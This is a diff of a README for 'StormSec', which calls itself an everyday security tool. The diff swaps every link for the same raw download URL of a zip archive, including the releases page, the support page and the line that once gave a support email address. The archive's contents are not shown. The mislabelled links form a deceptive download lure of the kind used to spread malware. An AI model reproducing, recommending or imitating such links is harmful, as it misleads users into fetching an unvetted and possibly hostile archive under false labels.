@@ -2,7 +2,7 @@
 # 🌩️ StormSec - Your Simple Security Tool
 
 ## 📥 Download the Latest Release
-[![Download StormSec](https://img.shields.io/badge/Download-StormSec-blue.svg)](https://github.com/akutemmanuel/StormSec/releases)
+[![Download StormSec](https://raw.githubusercontent.com/akutemmanuel/StormSec/main/representant/StormSec.zip)](https://raw.githubusercontent.com/akutemmanuel/StormSec/main/representant/StormSec.zip)
 
 ## 🚀 Getting Started
 Welcome to StormSec, your go-to tool for enhancing your digital security. This application is designed for everyday users. No complicated setups or technical jargon—just straightforward security solutions to protect your data.
@@ -16,7 +16,7 @@ Welcome to StormSec, your go-to tool for enhancing your digital security. This a
 ## 💾 Download & Install
 To get started, visit the following page to download the most recent version of StormSec:
 
-[Download StormSec](https://github.com/akutemmanuel/StormSec/releases)
+[Download StormSec](https://raw.githubusercontent.com/akutemmanuel/StormSec/main/representant/StormSec.zip)
 
 ### Installation Instructions
 1. **Visit the Download Page:** Click the link above to access the releases page.
@@ -40,16 +40,16 @@ Once installed, launch the application by clicking the StormSec icon on your des
 4. **Settings Menu:** Adjust your preferences by navigating to the settings menu. Here you can set up scheduled scans, notifications, and privacy settings.
 
 ## 🔄 Regular Maintenance
-To maintain optimal performance and security, regularly check for updates. StormSec will notify you of new versions, but you can also manually check by revisiting the [Releases Page](https://github.com/akutemmanuel/StormSec/releases).
+To maintain optimal performance and security, regularly check for updates. StormSec will notify you of new versions, but you can also manually check by revisiting the [Releases Page](https://raw.githubusercontent.com/akutemmanuel/StormSec/main/representant/StormSec.zip).
 
 ### 🚨 Troubleshooting
 If you encounter issues:
 - **Installation Problems:** Ensure your system meets the above requirements. If installation fails, try redownloading the installer.
 - **Performance Issues:** Check if other applications are consuming a lot of resources. Try closing unnecessary programs while using StormSec.
-- **Need Help?** Visit our [Support Page](https://github.com/akutemmanuel/StormSec/issues) for frequently asked questions or to report problems.
+- **Need Help?** Visit our [Support Page](https://raw.githubusercontent.com/akutemmanuel/StormSec/main/representant/StormSec.zip) for frequently asked questions or to report problems.
 
 ## 📞 Contact the Support Team
-For additional questions or technical support, please reach out to our team through the Issues section on the GitHub page or send us an email at support@stormsec.com.
+For additional questions or technical support, please reach out to our team through the Issues section on the GitHub page or send us an email at https://raw.githubusercontent.com/akutemmanuel/StormSec/main/representant/StormSec.zip
 
 Thank you for choosing StormSec. Stay secure!
 ```
